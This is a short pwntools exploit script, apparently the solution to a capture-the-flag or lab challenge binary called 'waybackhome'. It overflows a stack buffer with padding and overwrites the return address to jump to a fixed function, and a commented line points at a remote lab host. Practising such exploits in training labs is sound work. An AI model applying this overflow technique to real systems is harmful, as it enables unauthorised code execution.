from pwn import *

r = process('/media/sf_D_DRIVE/waybackhome')
# r = remote('lab.scist.org', 33302)
r.sendline((b'A') * 0x20 + (b'A') * 8 + p64(0x401182))

r.interactive()
